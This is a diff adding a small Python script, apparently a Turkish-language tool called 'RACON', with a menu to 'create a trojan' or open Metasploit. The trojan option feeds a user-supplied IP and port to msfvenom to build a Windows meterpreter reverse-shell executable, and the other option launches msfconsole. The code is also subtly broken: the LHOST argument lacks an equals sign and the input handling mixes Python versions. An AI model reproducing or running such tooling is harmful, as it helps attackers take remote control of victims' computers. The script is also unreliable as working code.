@@ -1,0 +1,25 @@
+import os 
+
+os.system("clear")
+
+banner="""
+-------                   RACON                   -------
+         -------                          -------
+                 -------          -------
+                         --------
+"""
+print(banner)
+
+print("""
+1]Trojan olustur
+2]metasploiti ac""")
+girdi=input("------->""")
+if (girdi==1):
+
+         ip=raw_input("ip adresini giriniz------>")
+         port=raw_input("portu giriniz------->")
+         ismi=raw_input("trojan ismi------->")
+
+         os.system("clear && msfvenom -p windows/meterpreter/reverse_tcp LHOST"+ip+" LPORT="+port+" -f exe -o "+ismi)
+if (girdi==2):
+        os.system("msfconsole")
